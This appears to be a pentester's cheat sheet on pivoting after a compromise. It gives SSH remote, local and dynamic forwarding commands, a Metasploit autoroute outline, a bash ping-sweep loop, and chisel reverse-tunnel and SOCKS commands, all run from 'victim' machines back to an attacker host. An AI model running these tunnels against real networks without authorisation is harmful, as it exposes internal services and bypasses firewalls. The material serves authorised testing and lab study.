# SSH port forwarding

Port tunneling or forwarding is a networking technique that allows traffic between local and remote machine.
We use port tunneling when we either canâ€™t reach a destination because it is protected behind a firewall or only accessible internally.

## Remote Forwarding
Exposing the internal services and interact with them from attacker machine.
so basically :

|Victim side|Attacker side|
|--|--|
|127.0.0.1:3306|192.168.0.106:8080|
|127.0.0.1:5900|192.168.0.106:5555|

With remote port forwarding attacker is the one listening locally for traffic from the compromised server.

`ssh -R RemortPort:localhost:localport attacker@192.168.0.106`

Commands will be ==executed on victim machine==:
```
ssh -R 8080:127.0.0.1:3306 attacker@192.168.0.106
ssh -R 5555:127.0.0.1:5900 attacker@192.168.0.106
```

## Local Forwarding
Making remote service available on local machine.
```
ssh -L local_port:remort_ip:remort_port victim@ip

ssh -L 5050:127.0.0.1:21 admin@10.10.10.90
```
means on attacker machine local port 5050 will be routed to port 21 of victim machine 10.10.10.90.


## ssh -D - dynamic port forwarding 

### If there is no way then use msf
****
web_delivery > autoroute > ping sweep > Will get all the internal services.

# Manual
To find out the avaiable hosts in linux we will do ping speep
`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`
by this simple script we will be able to find up hosts.

***So 3 ways:***
1. ssh from the machine to attacker (remote)
2. ssh from attacker to machine (local)
3. autoroute for internal ip running services.

# Pivoting without SSH

**Usage:**

Start the server in kali: (Attacker Machine) 10.10.14.3
```bash
./chisel server -p 8000 --reverse
```

Start the client in victim: (Victim Machine) 10.10.10.240
```bash
# Listen on Kali 80, forward to localhost port 80 on client
chisel client 10.10.14.3:8000 R:80:127.0.0.1:80

# Listen on Kali 4444, forward to 10.10.10.240 port 80
chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80

# Create SOCKS5 listener on 1080 on Kali, proxy through client
chisel client 10.10.14.3:8000 R:socks

```


**Basic Client Listener:**
If you are on target that you cant connect to the internet but can route to my attacking machine. 
1. Start the server on attacker machine: `chisel server -p 8000`
2. `./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443` on the victim machine. This will connect to attacker box and starts listerner on the target box. Any traffic sent to that port in victim machine will be sent to my server and exploitdb will get accessed by attacker on victim machine.
3. `curl http://127.0.0.1:9001`

**Basic Server Listening:** (Access Internal Network of Victim)
1. `./chisel server -p 8000 -reverse` on attcker machine.
2. `.\c.exe client 10.10.14.3:8000 R:8888:localhost:8888` on victim machine so that all the traffic i send to attacker port will be routed to internal service on victim machine.
